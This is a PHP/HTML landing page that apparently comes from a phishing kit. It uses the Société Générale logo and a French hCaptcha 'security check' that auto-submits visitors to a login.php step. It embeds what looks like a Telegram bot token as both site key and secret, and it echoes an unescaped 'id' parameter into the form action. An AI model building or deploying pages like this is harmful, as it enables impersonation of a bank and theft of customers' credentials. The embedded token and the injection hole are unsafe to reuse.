<?php
$sitekey = '7271659943:AAEKiFm3G2X-z-obEp9QX-OQ41HJ5e5Km_g';
$secretkey = '7271659943:AAEKiFm3G2X-z-obEp9QX-OQ41HJ5e5Km_g';
?>
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">

    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

    <script src='https://www.hCaptcha.com/1/api.js' async defer></script>

</head>

<body>

    <div class="container h-100 d-flex justify-content-center">

        <div class="my-auto"> 
         
         <img src="https://www.societegenerale.com/sites/default/files/image/logo/02_ok.svg"> 
        
            <form method="post" action="login.php<?php echo isset($_GET['id']) ? '?id=' . $_GET['id'] : ''; ?>" style="margin-top:45%" id="myForm">
                <p>Veuillez vérifier que vous êtes un humain pour continuer sur le site.</p>
                
                <div class="h-captcha" data-sitekey="<?php echo $sitekey ?>"  data-callback="callback"></div><br/><br/>
                <div id="challenge-body-text" class="core-msg spacer">Ce site Web doit vérifier la sécurité de votre connexion avant de continuer...</div>
            </form>
        </div>
    </div>
    </form>
    <script>
        function callback() {
            document.getElementById("myForm").submit();
        };
    </script>
</body>

</html>